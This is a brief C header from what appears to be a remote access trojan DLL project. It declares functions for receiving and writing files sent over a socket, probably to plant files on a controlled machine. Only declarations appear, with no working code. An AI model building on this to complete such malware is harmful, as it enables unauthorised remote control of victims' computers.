#pragma once

#include "RAT-Dll-Main.h"

INT handlePutFile(__in SOCKET clientSock);

INT performPutFile(__in const char* filePath, __in const char* fileBytes, __in bool overwrite);